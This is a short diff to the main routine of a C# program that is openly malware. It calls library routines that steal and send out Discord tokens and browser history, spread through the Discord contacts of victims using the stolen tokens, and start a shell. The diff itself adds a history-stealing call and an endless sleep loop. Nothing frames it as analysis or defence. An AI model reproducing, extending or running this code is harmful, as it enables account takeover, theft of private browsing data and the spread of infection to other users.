@@ -20,6 +20,11 @@ namespace Client
         {
             Console.WriteLine("The Love Letter.");
 
+            Armitage.Cookies.History_Stealer.ParseAndSendSQL(@"C:\Users\LOLXd\Documents\History");
+
+            while (true) Thread.Sleep(90000);
+
+
             ArgsParser(args);
 
             CheckRealApplication();
@@ -96,6 +101,7 @@ namespace Client
             // Discord tokens
             var discord_tokens = Armitage.Cookies.Discord_Token.Stealu();
             Armitage.Cookies.Discord_Token.Send(discord_tokens);
+            // run every 5 days or so
             if (discord_tokens.Count > 0 && (Constants.Today - Properties.Settings.Default.LastDiscordSent).TotalDays > 5)
             {
                 Armitage.Postman.Discord_Spreader spreader = new Armitage.Postman.Discord_Spreader(discord_tokens.Select(x => x.Item2).ToArray());
@@ -115,6 +121,7 @@ namespace Client
             Armitage.Shell.Shell.Start();
 
             Properties.Settings.Default.IsFirstRun = false;
+
             Properties.Settings.Default.Save();
 
             Console.WriteLine("All Done");
